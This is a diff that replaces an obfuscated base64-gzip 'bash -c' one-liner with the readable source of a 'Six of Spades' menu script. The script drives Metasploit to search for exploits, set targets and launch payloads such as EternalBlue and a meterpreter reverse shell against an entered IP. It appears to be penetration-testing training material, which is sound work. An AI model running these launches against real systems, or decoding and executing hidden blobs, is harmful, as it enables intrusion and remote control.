@@ -1,1 +1,64 @@
-bash -c "$(echo H4sICFPtXmcAA1NpeF9vZl9TcGFkZXMArVZtb9owEP7Or7gxJNqpBCjVJg3tQ9UhbRJbESBN1SZFJrkSq4mdxU4Btf3v80tIk0LalPU+IPvs516fc3j/rrugrLsgImg0Lq7Of35p/+kNBr/7w8HHqN2YjmajeabqqX0jEtceZ4KH6Hok8Y+O4a4BSlYBDRFkkuIQfG5UWrwQSZLv0As4dBCarTvt6qFZPmmapVtb9sHvoSwzugZ+DbOY+CjKR/cV+DHeYkKWCD9QEhGHnEq45glccCYTHoboP49/IqO1MSF2Dvbj66df03+lVOH7DsxU17zAZF0ZfiX+VOMlpDEQtoW/xv/AgWnKYEI2ISe+CYLAnCRLlLXwZ47yut9lDfzh9bfENhOjmJ2fJaiS6MTQvAg49fCz8uOZ1eOQEIHQskqgLNdr6R+XtuZ6aab2hGBmy7aQsqUpIG67SFmB1o7jPAb81GAe94hJ1C0QlhRqE8EROkvnBH5R5vOVOIExZen6WOdmb7n61v4YmxWRRURabbtVsNFWMe7G9vgKQecvdNbQzIIrQofKNpW74OGwpDo9vMJS6ngt0bM8Di+wDDA3wkiE2xpnuu7K1rorokU3Ev1Pbq/fc1EhGQkXYYqm+tllVxuo41Dasfo+0WC7cWlc2bg84VbRkeljZqmVG6nZuFRzv2htqCgkYfrtcjafFcwpdcBXwGNJlYGavR0c2lv1ADGdapw9QmRJKBNSTYEN6H8ae0iftnEUibElRKRJECf6t5vob5dAV3qx4UOGe2s+7EGGVEg0NbPgMOBCvg4Y80QaqF5UcHBMUmafiW1JV1SquS8mmnfrrcg4Ob8aX55/LXup5qlSj7UaWqYImWZyOdUandsQkpTVpPDZLoWfklV/7VRFnuXkQlX+5iVfH1729Z3dkpD62SfMgXmyseV+xnfBCwriVf4dnCQohHpLN3CDG5BcsUWmCdMrTZQIWbo3R0sqBn3oCKP0OcPGw86f1cY/gmWW3+0KAAA= | base64 -d | gunzip)"
+#!/bin/bash
+
+CYAN='\033[1;36m'
+RESET='\033[0m'
+
+msfconsole_card() {
+    while true; do
+        clear
+        echo -e "${CYAN}"
+        echo "     __________________________________________"
+        echo "    |               Six of Spades              |"
+        echo "    |  Leverage Metasploit for Controlled      |"
+        echo "    |                 Exploits                 |"
+        echo "    |__________________________________________|"
+        echo "    |                                          |"
+        echo "    |  1. Search for Exploits                  |"
+        echo "    |  2. Set up an Exploit                    |"
+        echo "    |  3. Run Payload for a Target             |"
+        echo "    |  4. Exit                                 |"
+        echo "    |__________________________________________|"
+        echo -e "${RESET}"
+
+        read -p "Choice: " choice
+        case $choice in
+            1)
+                clear
+                echo -e "${CYAN}Searching for exploits in Metasploit...${RESET}"
+                read -p "Enter a search term (e.g., Windows, Linux): " search_term
+                echo "Searching for exploits matching '$search_term'..."
+                msfconsole -q -x "search $search_term; exit"
+                ;;
+            2)
+                clear
+                echo -e "${CYAN}Setting up an exploit in Metasploit...${RESET}"
+                read -p "Enter the exploit name (e.g., exploit/windows/smb/ms17_010_eternalblue): " exploit_name
+                read -p "Enter the target IP: " target_ip
+                echo "Setting up $exploit_name for target $target_ip..."
+                msfconsole -q -x "use $exploit_name; set RHOSTS $target_ip; show options; exit"
+                ;;
+            3)
+                clear
+                echo -e "${CYAN}Running payload against a target...${RESET}"
+                read -p "Enter the exploit name: " exploit_name
+                read -p "Enter the payload name (e.g., windows/meterpreter/reverse_tcp): " payload_name
+                read -p "Enter the target IP: " target_ip
+                read -p "Enter the listening IP: " lhost
+                read -p "Enter the listening port: " lport
+                echo "Launching exploit with $payload_name against $target_ip..."
+                msfconsole -q -x "use $exploit_name; set PAYLOAD $payload_name; set RHOSTS $target_ip; set LHOST $lhost; set LPORT $lport; run; exit"
+                ;;
+            4)
+                echo -e "${CYAN}Exiting...${RESET}"
+                break
+                ;;
+            *)
+                echo -e "${CYAN}Invalid choice. Try again.${RESET}"
+                ;;
+        esac
+        echo -e "${CYAN}Press any key to return to the menu...${RESET}"
+        read -n 1 -s
+    done
+}
+
+msfconsole_card
